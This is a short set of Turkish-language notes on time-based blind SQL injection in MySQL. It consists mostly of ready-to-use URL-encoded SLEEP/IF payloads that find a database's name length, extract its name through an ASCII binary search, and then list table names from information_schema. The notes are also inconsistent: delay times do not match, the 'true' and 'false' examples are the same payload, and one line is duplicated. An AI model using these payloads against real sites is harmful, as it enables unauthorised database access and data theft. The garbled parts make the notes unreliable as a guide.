# time based sql injection

## örnek 

### payload

```bash
1 AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)  
```

#### eğer 10 saniye bekletirse devam et

**burada if koşuluna bakar eğer koşul doğru sağlandıysa 4 saniye bekletir, eğer koşul yanlış ise hemen cevap döner**

### örn


**database isminin lengthi 6 karakter ise bekletir**

```bash
5+AND+(SELECT+1337+FROM+(SELECT(SLEEP(4-(IF((LENGTH(DATABASE())=6),0,10)))))+RANDSTR)
```

**database isminin lengthi 6 karakter değil ise hemen cevap döner**

```bash
5+AND+(SELECT+1337+FROM+(SELECT(SLEEP(4-(IF((LENGTH(DATABASE())=6),0,10)))))+RANDSTR)
```


## db name öğrenmek için 


Her pozisyon için %3e (yani >) ile ASCII değerini daralt. Aşağıda pozisyon 1 var; ,1,1) kısmındaki ilk 1'i 2, 3... yaparak diğer harflere geçersin.

```bash
5+AND+(SELECT+1337+FROM+(SELECT(SLEEP(4-(IF((ASCII(SUBSTRING(DATABASE(),1,1))%3e109),0,10)))))RANDSTR)
```

Binary search mantığı (aralık 32–126):
- 4 sn beklerse → karakter > 109, alt sınırı yukarı çek.
- Anında dönerse → ≤ 109, üst sınırı aşağı çek.
- ~7 istekte harfi bulursun.

Kesin doğrulama (eşitlik ile, %3d):
5+AND+(SELECT+1337+FROM+(SELECT(SLEEP(4-(IF((ASCII(SUBSTRING(DATABASE(),1,1))%3d122),0,10)))))RANDSTR)

▎ 122 = z. Pozisyon 2 için ,1,1) → ,2,1) yap, 109 = m çıkar → DB adı: zm


▎ 122 = z. Pozisyon 2 için ,1,1) → ,2,1) yap, 109 = m çıkar → DB adı: zm


AŞAMA 2 — Tablo adlarını öğren

Artık DB adını (zm) biliyorsun. Tablolar information_schema.tables'da; table_schema=DATABASE() ile sadece bu DB'yi filtreliyoruz, LIMIT ile satır satır geziyoruz.

2b) İlk tablonun adının uzunluğu

**LIMIT 0,1 = 1. tablo. =N'i artırarak uzunluğu bul:**

```bash
5+AND+(SELECT+1337+FROM+(SELECT(SLEEP(4-(IF((LENGTH((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3dDATABASE()+LIMIT+0,1))%3d5),0,10)))))RANDSTR)
```


**İlk tablonun karakterlerini çıkar (binary search)**


```bash
5+AND+(SELECT+1337+FROM+(SELECT(SLEEP(4-(IF(((SELECT+COUNT(*)+FROM+information_schema.tables+WHERE+table_schema%3dDATABASE())%3d10),0,10)))))RANDSTR)
```

**İlk tablonun karakterlerini çıkar (binary search)**

```bash
SUBSTRING(...,1,1) → pozisyon (1,2,3...), %3e ile ASCII daralt:
5+AND+(SELECT+1337+FROM+(SELECT(SLEEP(4-(IF((ASCII(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3dDATABASE()+LIMIT+0,1),1,1))%3e109),0,10)))))RANDSTR)
```